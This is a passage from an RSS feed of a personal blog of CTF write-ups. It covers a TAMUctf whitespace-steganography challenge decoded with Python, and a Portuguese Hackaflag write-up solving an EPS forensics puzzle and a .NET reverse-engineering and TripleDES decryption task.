00000020: 0a20 2020 0909 2020 0920 090a 2020 2009  .   ..  . ..   .                                                                                                                                                                    
00000030: 0920 0909 2009 0a20 2020 0909 0909 2009  . .. ..   .... .                                                                                                                                                                       
00000040: 090a 2020 2009 0920 2020 200a 2020 2009  ..   ..    .   .                                                                                                                                                                        
00000050: 0920 0920 2020 0a20 2020 0920 0909 0909  . .   .   . .... 
00000060: 090a 2020 2009 0920 0909 2009 0a20 2020  ..   .. .. ..    
00000070: 0909 0909 2020 090a 2020 2009 2009 0909  ....  ..   . ... 
00000080: 0909 0a20 2020 0909 0920 0909 090a 2020  ...   ... ....   
00000090: 2009 0920 0920 2020 0a20 2020 0909 2009   .. .   .   .. . 
000000a0: 2020 0a20 2020 0909 0920 0920 200a 2020    .   ... .  .   
000000b0: 2009 2009 0909 0909 0a20 2020 0909 0920   . ......   ...  
000000c0: 2009 090a 2020 2009 0909 2020 2020 0a20   ...   ...    .  
000000d0: 2020 0909 2009 2020 0a20 2020 0909 2020    .. .  .   ..   
000000e0: 2009 090a 2020 2009 0920 2020 090a 2020   ...   ..   ..   
000000f0: 2009 0920 0909 0920 0a20 2020 0909 2020   .. ... .   ..   
00000100: 0909 090a 2020 2009 2009 0909 0909 0a20  ....   . ......  
00000110: 2020 0909 0909 2020 090a 2020 2009 0920    ....  ..   ..  
00000120: 2020 200a 2020 2009 0909 2009 2009 0a20     .   ... . ..  
00000130: 2020 0920 0909 0909 090a 2020 2009 0920    . ......   ..  
00000140: 0920 2020 0a20 2020 0909 2009 2020 0a20  .   .   .. .  .  
00000150: 2020 0909 0920 0909 200a 2020 2009 0920    ... .. .   ..  
00000160: 2009 090a 2020 2009 0909 0909 2009 0a20   ...   ..... ..  
00000170: 2020 0920 2020 2009 0a20 2020 0909 2020    .    ..   ..   
00000180: 0920 090a 2020 2009 0920 2020 0909 0a20  . ..   ..   ...  
00000190: 2020 0909 2020 2020 090a 2020 2009 0909    ..    ..   ... 
000001a0: 2020 2020 0a20 2020 0909 0920 2009 090a      .   ...  ... 
000001b0: 2020 2009 0920 2009 2009 0a20 2020 0909     ..  . ..   .. 
000001c0: 0920 0920 200a 2020 2009 0920 0920 2009  . .  .   .. .  . 
000001d0: 0a20 2020 0909 2009 2020 200a 2020 2009  .   .. .   .   . 
000001e0: 0909 2009 0909 0a20 2020 0920 2020 2020  .. ....   .      
000001f0: 0a20 2020 0909 2020 0909 200a 2020 2009  .   ..  .. .   . 
00000200: 0920 0909 0909 0a20 2020 0920 2020 2020  . .....   .      
00000210: 0a20 2020 0909 0920 0920 200a 2020 2009  .   ... .  .   . 
00000220: 0920 0909 0909 0a20 2020 0909 2009 0920  . .....   .. ..  
00000230: 200a 2020 2009 2020 2020 200a 2020 2009   .   .     .   . 
00000240: 0920 2020 2009 0a20 2020 0920 2020 2020  .    ..   .      
00000250: 0a20 2020 0909 0920 2009 090a 2020 2009  .   ...  ...   . 
00000260: 0920 0920 2009 0a20 2020 0920 2020 2020  . .  ..   .      
00000270: 0a20 2020 0909 2020 0920 090a 2020 2009  .   ..  . ..   . 
00000280: 0909 2020 0920 0a20 2020 0909 0920 0920  ..  . .   ... .  
00000290: 090a 2020 2009 0909 2020 0909 0a20 2020  ..   ...  ...    
000002a0: 0920 2020 2020 0a20 2020 0909 0920 0920  .     .   ... .  
000002b0: 200a 2020 2009 0920 2020 2009 0a20 2020   .   ..    ..    
000002c0: 0909 2009 2020 200a 2020 2009 0909 2009  .. .   .   ... . 
000002d0: 2020 0a20 2020 0920 2020 2020 0a20 2020    .   .     .    
000002e0: 0920 0909 2020 0a20 2020 0909 2020 0920  . ..  .   ..  .  
000002f0: 090a 2020 2009 0920 2009 2009 0a20 2020  ..   ..  . ..    
00000300: 0909 2020 0909 090a 2020 2009 2020 2020  ..  ....   .     
00000310: 200a 2020 2009 0909 0920 2009 0a20 2020   .   ....  ..    
00000320: 0909 2009 0920 200a 2020 2009 0920 0909  .. ..  .   .. .. 
00000330: 2020 0a20 2020 0909 2009 0909 090a 2020    .   .. .....   
00000340: 2009 0920 2009 0909 0a20 2020 0920 2020   ..  ....   .    
00000350: 2020 0a20 2020 0909 0920 0920 200a 2020    .   ... .  .   
00000360: 2009 0920 2009 2009 0a20 2020 0909 2020   ..  . ..   ..   
00000370: 0920 090a 2020 2009 0909 2009 0909 0a20  . ..   ... ....  
00000380: 2020 0909 0920 2009 090a 2020 2009 2020    ...  ...   .   
00000390: 2020 200a 2020 2009 0920 0909 2020 0a20     .   .. ..  .  
000003a0: 2020 0909 2009 0920 200a 2020 2009 0920    .. ..  .   ..  
000003b0: 2009 2009 0a20 2020 0920 0920 0909 090a   . ..   . . .... 
000003c0: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
000003d0: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
000003e0: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
000003f0: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000400: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000410: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000420: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000430: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000440: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000450: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000460: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000470: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000480: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
00000490: 090a 2020 090a 2020 090a 2020 0a0a 0a23  ..  ..  ..  ...# 
000004a0: 696e 636c 7564 6520 3c69 6f73 7472 6561  include &amp;lt;iostrea 
000004b0: 6d3e 0a75 7369 6e67 206e 616d 6573 7061  m&amp;gt;.using namespa 
000004c0: 6365 2073 7464 3b0a 0a69 6e74 206d 6169  ce std;..int mai 
000004d0: 6e28 290a 7b0a 0963 6f75 7420 3c3c 2022  n().{..cout &amp;lt;&amp;lt; &quot; 
000004e0: 4865 6c6c 6f2c 2057 6f72 6c64 7321 5c6e  Hello, Worlds!\n 
000004f0: 223b 0a09 7265 7475 726e 2030 3b0a 7d0a  &quot;;..return 0;.}.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Using the xxd command and the hexadecimal of this file was shown.&lt;/p&gt;

&lt;p&gt;Those strange ‘20’ and ‘09’ and ‘0a’ gotta mean something. After analyzing for a couple of minutes I noticed that the ‘0a’ repeats itself always after 10 spaces.&lt;/p&gt;

&lt;p&gt;So I imagined this should be a binary encoded string where ‘20’ = 0 , ‘09’ = 1 and ‘0a’ = space. So I wrote a small python script to extract the flag!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flagenc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flagenc.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rwa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;support&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;support2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagenc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;09&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;support&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;support&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;	
&lt;span class=&quot;n&quot;&gt;support&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;support&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;flagenc2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;support&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagenc2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;flagenc3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flagenc2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;support2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;support2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagenc3&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]FLAG:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;support2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://gist.githubusercontent.com/D4nPs/e206fcf9109159b823041e25452263d6/raw/7a564de46c45724270c41f1e7a4f12c4c0553a24/hello.py&quot; class=&quot;btn btn-blue&quot;&gt;LINK BASE GITHUB&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/5/code2.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;

&lt;p&gt;by me&lt;/p&gt;
</description>
        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/tamuctf2019-hello-world-write-up/</link>
        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-hello-world-write-up/</guid>
        
        <category>CTF</category>
        
        <category>|</category>
        
        <category>RATF</category>
        
        <category>|</category>
        
        <category>FLAG</category>
        
        <category>|</category>
        
        <category>CHALLENGE</category>
        
        
        <category>challenge</category>
        
      </item>
    
      <item>
        <title>HACKAFLAG CAMPINAS Reverse &amp; Misc Write-up</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: CTF | RATF | FLAG | CHALLENGE &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

&lt;p&gt;Fala galera! até o dia 17/04 rolou a 1ª etapa do Hackaflag 2019.Consegui a 4ª colocação nesse etapa e os desafios foram bem legais.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Resolvi trazer esses dois porque foram os que achei mais divertidos de resolver.&lt;/p&gt;

&lt;p&gt;PS: Esses foram os métodos que usei para resolver, talvez não os melhores, mas com certeza cheguei nas flags xd&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;1 Desafio -&amp;gt; MISC&lt;/p&gt;

&lt;p&gt;&lt;i&gt;Descrição: Por mais pequeno que seja, esse desafio vem com a missão de fazer você conhecer um formato de arquivo EPS e entender como ele é composto.&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;Além dessa breve descrição nos é dado um arquivo para download. Vamos analisá-lo.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;[~/ctf/hackaflag/misc]$ file flag                                            
flag: DOS EPS Binary File Postscript starts at byte 30 length 68473 
TIFF starts at byte 68503 length 2317330&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Bem como disse a descrição, temos um arquivo EPS, mas ainda não conseguimos abri-lo porque no próprio retorno do comando file ele nos diz que o EPS começa no byte 30.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code2.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Precisamos remover esses 30 primeiros bytes. Vamos usar o comando ‘dd’ para isso.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;dd if=flag of=flag.eps ibs=30 skip=1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Agora quando rodamos o comando ‘file’ novamente já nos é retornado outra coisa&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;[~/ctf/hackaflag/misc/writeup]$ file flag.eps                                               
flag.eps: PostScript document text conforming DSC level 3.0, type 
EPS, Level 2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Vamos tentar abrí-lo com o programa &lt;b&gt;Inkscape&lt;/b&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code3.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Erro, pois ainda no arquivo há um tiff como vimos la no primeiro ‘file’ que demos.&lt;/p&gt;

&lt;p&gt;Para retirá-lo, vamos usar o comando ‘truncate’&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;[~/ctf/hackaflag/misc/writeup]$ truncate -s 68395 flag.eps&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Agora ao abrí-lo com o Inkscape, temos&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code4.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Essa imagem.&lt;/p&gt;

&lt;p&gt;Essa parte é sem dúvida a pior do desafio, achar onde diabos está a flag aqui.Passei horas, cheguei a pensar que a flag não estivesse na imagem de tanto procurar, mas ela está ai. Uma parte da definição de uma EPS file diz isso:&lt;/p&gt;

&lt;p&gt;&lt;i&gt;It is more like a postscript program that instructs images and drawings to be placed on a document&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;Então pesquisei em formas de manipular essas imagens presentes e uma delas me ajudou, o XML Editor.&lt;/p&gt;

&lt;p&gt;Até que&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code5.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ta aí a coisa.&lt;/p&gt;

&lt;p&gt;Pegando todos os chars temos:&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code6.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;HACKAFLAG{ESCOND_DO_NO_L_MBO}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;O que não é a flag final, mas é fácil ver que a flag fica…&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;HACKAFLAG{ESCONDIDO_NO_LIMBO}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;2 desafio -&amp;gt; REVERSE&lt;/p&gt;

&lt;p&gt;Desafio mais complicado dessa primeira etapa, foi o que teve menos solves. Por assumir coisas erradas demorei muito mais tempo do que precisava para resolver esse desafio, mas no fim deu tudo certo.&lt;/p&gt;

&lt;p&gt;Descrição: Consegue me ajudar?&lt;/p&gt;

&lt;p&gt;Além da descrição nos é dado um binário, campinas.exe. Um binário windows, vamos executá-lo.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code7.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De cara já temos nossa flag em b64 somente &lt;em&gt;-&lt;/em&gt; , sqn xd&lt;/p&gt;

&lt;p&gt;Joguei o binário no Ghidra para ver do que se tratava.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code8.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Analisando as funções vemos uma bem interessante, Criptografar.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code9.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Mas está muito complicado de analisá-la assim, fui atrás de ver as strings para ver se encontrava alguma luz.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code10.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Analisando notei essa que dizia “.NET framework 4.6.1” e eu sei que consigo usar decompiler nesses sistemas, no caso usei o dotPeek da JetBrains e consegui o código descompilado da função Criptografar.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code11.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Analisando passo a passo do código&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Primeiro é feito uma requisição para essa string em hexa mas em uma formatação estranha, depois é passado outros parâmetros como método, ContentType, etc, quem não nos interessa.&lt;/li&gt;
	&lt;li&gt;Depois ele pega o conteúdo recebido do servidor e joga no MD5cryptoServiceProvider, ou seja, gera um md5 do retorno.&lt;/li&gt;
	&lt;li&gt;Após isso, é criado um TripleDESCryptoServiceProvider que tem como um dos parâmetros a chave, que é a hash md5 que foi gerado a pouco.&lt;/li&gt;
	&lt;li&gt;Ao final retorna a flag em base64 como vimos ao rodar o programa.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nossa primeira e mais difícil tarefa será descobrir o endereço dessa requisição para conseguir nossa chave.&lt;/p&gt;

&lt;p&gt;Vemos que a string encodada passada está em servindo de parâmetro para outra função, vamos analisá-la, a class8_metho0, no meu caso.&lt;/p&gt;

&lt;p&gt;No caso a class8_method0 só faz uma checagem de data e retorna a string para a class9_method0&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code12.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fiz uma pequena alteração no código e rodei a função passando a string e o inteiro que vi na função &lt;b&gt;Criptografa&lt;/b&gt;.&lt;/p&gt;

&lt;p&gt;E me é retornado isso:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;xdd`c*??xqs{qv|qw&amp;gt;s}&amp;gt;rb?sdv?tucqvyc?!qt(vt”tvrr qts !%t’r#%q$”rr)r()?s}}q~ts~db|&amp;gt;`x`&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;wtf is isso?&lt;/p&gt;

&lt;p&gt;Notei que eu estava esperando uma url e resolvi comparar, notemos que podemos fazer &lt;code&gt;ascii(x) — 16 -&amp;gt; h ascii(d) +16 -&amp;gt; t ascii(`)-&amp;gt; p ascii(c) + 16-&amp;gt; s&lt;/code&gt; daí ja conseguimos o ‘https’&lt;/p&gt;

&lt;p&gt;Eu realmente espero do fundo do coração que haja um método melhor de resolver do que esse T.T
Ao terminarmos de decodar:&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://hackaflag.com.br/ctf/desafios/1ad8fd2dfbb0adc015d7b35a42bb9b89/commandcontrol.php&quot; class=&quot;text-white&quot;&gt;https://hackaflag.com.br/ctf/desafios/1ad8fd2dfbb0adc015d7b35a42bb9b89/commandcontrol.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Acessando esse link encontramos nossa chave.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;THMPV-77D6F-94376–8HGKG-VRDRQ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Depois disso devemos lembrar que a chave foi encodada em b64 para fazer criptografar nossa flag.&lt;/p&gt;

&lt;p&gt;Então,&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Criptografia TripleDES&lt;/li&gt;
	&lt;li&gt;Modo ECB&lt;/li&gt;
	&lt;li&gt;chave = d5637a2c7e17f17947df72f5b3d3d20c&lt;/li&gt;
	&lt;li&gt;flag = YMP1zrjTmr1P0wVJh7ocL55O5ZY3EYec&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Já temos tudo!&lt;/p&gt;

&lt;p&gt;Usei essa ótima ferramenta online para conseguir a flag.&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code13.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;http://tripledes.online-domain-tools.com/&quot; class=&quot;btn btn-blue&quot;&gt;CLICK TO ACCESS 3DES Encryption&lt;/a&gt;&lt;/p&gt;

&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/7/code14.png&quot; alt=&quot;image example&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tive que passar a flag para hex, pois a tool não suportava b64.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;HACKAFLAG{TripleDESneT}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Assim foi como resolvi essas duas flags dessa etapa, espero que alguém tenha aprendido algo, se não escrevi isso tudo pra nada xd&lt;/p&gt;

&lt;p&gt;Obrigado!&lt;/p&gt;

&lt;p&gt;By me&lt;/p&gt;
</description>
        <pubDate>Thu, 18 Apr 2019 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/hackflag-campinas-reverse-&-misc-write-up/</link>
        <guid isPermaLink="true">http://localhost:4000/hackflag-campinas-reverse-&-misc-write-up/</guid>
        
        <category>CTF</category>
        
        <category>|</category>
        
        <category>FLAG</category>
        
        <category>|</category>
        
        <category>CHALLENGE</category>
        
        
        <category>challenge</category>
        
      </item>
    
      <item>
        <title>Frolic — HacktheBox Walkthrough</title>
        <description>&lt;p&gt;&lt;small&gt; &lt;i&gt; Tags: CTF | RATF | FLAG | CHALLENGE &lt;/i&gt; &lt;/small&gt;&lt;/p&gt;

